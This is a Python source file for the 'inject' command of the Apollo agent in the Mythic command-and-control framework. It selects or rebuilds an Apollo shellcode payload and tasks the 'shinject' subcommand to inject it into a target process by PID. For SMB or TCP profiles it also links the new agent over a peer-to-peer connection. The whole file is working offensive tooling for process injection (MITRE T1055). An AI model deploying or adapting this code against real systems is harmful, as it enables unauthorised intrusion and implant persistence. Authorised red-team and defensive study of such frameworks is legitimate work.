from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *
import base64
import sys
import asyncio

class InjectArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="template",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.ChooseOne,
                dynamic_query_function=self.get_payloads,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )]
            ),
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="PID",
                type=ParameterType.Number),
            CommandParameter(
                name="regenerate",
                cli_name="regenerate",
                display_name="Generate New Payload",
                type=ParameterType.Boolean,
                default_value=False,
                parameter_group_info=[ParameterGroupInfo(
                    required=False
                )]
            )
        ]

    errorMsg = "Missing required parameter: {}"

    async def get_payloads(self, inputMsg: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        fileResponse = PTRPCDynamicQueryFunctionMessageResponse(Success=False)
        payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            CallbackID=inputMsg.Callback,
            PayloadTypes=["apollo"],
            IncludeAutoGeneratedPayloads=False,
            BuildParameters=[MythicRPCPayloadSearchBuildParameter(PayloadType="apollo", BuildParameterValues={"output_type": "Shellcode"})]
        ))

        if payload_search.Success:
            file_names = []
            for f in payload_search.Payloads:
                file_names.append(f"{f.Filename} - {f.Description}")
            fileResponse.Success = True
            fileResponse.Choices = file_names
            return fileResponse
        else:
            fileResponse.Error = payload_search.Error
            return fileResponse


    async def parse_arguments(self):
        if self.command_line[0] != "{":
            raise Exception("Inject requires JSON parameters and not raw command line.")
        self.load_args_from_json_string(self.command_line)
        if self.get_arg("pid") == 0:
            raise Exception("Required non-zero PID")


async def inject_callback(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    return response


class InjectCommand(CommandBase):
    cmd = "inject"
    attributes=CommandAttributes(
        dependencies=["shinject"]
    )
    needs_admin = False
    help_cmd = "inject (modal popup)"
    description = "Inject agent shellcode into a remote process."
    version = 2
    script_only = True
    author = "@djhohnstein"
    argument_class = InjectArguments
    attackmapping = ["T1055"]
    completion_functions = {"inject_callback": inject_callback}

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        string_payload = [x.strip() for x in taskData.args.get_arg("template").split(" - ")]
        filename = string_payload[0]
        desc = string_payload[1]
        payload_search = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
            CallbackID=taskData.Callback.ID,
            PayloadTypes=["apollo"],
            Filename=filename,
            Description=desc,
            IncludeAutoGeneratedPayloads=False,
            BuildParameters=[MythicRPCPayloadSearchBuildParameter(PayloadType="apollo", BuildParameterValues={"output_type": "Shellcode"})]
        ))

        if not payload_search.Success:
            raise Exception("Failed to find payload: {}".format(taskData.args.get_arg("template")))

        if len(payload_search.Payloads) == 0:
            raise Exception("No payloads found matching {}".format(taskData.args.get_arg("template")))
        str_uuid = payload_search.Payloads[0].UUID
        payload = None
        if taskData.args.get_arg("regenerate"):
            newPayloadResp = await SendMythicRPCPayloadCreateFromUUID(MythicRPCPayloadCreateFromUUIDMessage(
                TaskID=taskData.Task.ID, PayloadUUID=str_uuid, NewDescription="{}'s injection into PID {}".format(taskData.Task.OperatorUsername, str(taskData.args.get_arg("pid")))
            ))
            if newPayloadResp.Success:
                # we know a payload is building, now we want it
                str_uuid = newPayloadResp.NewPayloadUUID
                while True:
                    resp = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                        PayloadUUID=newPayloadResp.NewPayloadUUID
                    ))
                    if resp.Success:
                        if resp.Payloads[0].BuildPhase == 'success':
                            # it's done, so we can register a file for it
                            payload = resp.Payloads[0]
                            break
                        elif resp.Payloads[0].BuildPhase == 'error':
                            raise Exception("Failed to build new payload ")
                        else:
                            await asyncio.sleep(1)
            else:
                logger.exception("Failed to build new payload")
                raise Exception("Failed to build payload from template {}".format(taskData.args.get_arg("template")))
        else:
            # fetch data about the payload
            resp = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                PayloadUUID=str_uuid
            ))
            if resp.Success:
                if resp.Payloads[0].BuildPhase == 'success':
                    # it's done, so we can register a file for it
                    payload = resp.Payloads[0]
                elif resp.Payloads[0].BuildPhase == 'error':
                    raise Exception("Selected Payload Failed to Build ")
                else:
                    raise Exception("Payload isn't done building")
        response.DisplayParams = "payload '{}' into PID {}".format(payload.Filename, taskData.args.get_arg("pid"))
        response.TaskStatus = MythicStatus.Processed
        c2_info = payload.C2Profiles[0]
        is_p2p = c2_info.Name == "smb" or c2_info.Name == "tcp"
        if not is_p2p:
            subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                TaskID=taskData.Task.ID,
                SubtaskCallbackFunction="inject_callback",
                CommandName="shinject",
                Params=json.dumps({"pid": taskData.args.get_arg("pid"), "shellcode-file-id": payload.AgentFileId})
            ))
        else:
            subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                TaskID=taskData.Task.ID,
                CommandName="shinject",
                Params=json.dumps({"pid": taskData.args.get_arg("pid"), "shellcode-file-id": payload.AgentFileId})
            ))
            if subtask.Success:
                connection_info = {
                    "host": "127.0.0.1",
                    "agent_uuid": str_uuid,
                    "c2_profile": c2_info
                }
                subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                    TaskID=taskData.Task.ID,
                    CommandName="link",
                    SubtaskCallbackFunction="inject_callback",
                    Params=json.dumps({
                        "connection_info": connection_info
                    })
                ))
            else:
                response.Success = False
                response.Error = subtask.Error
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
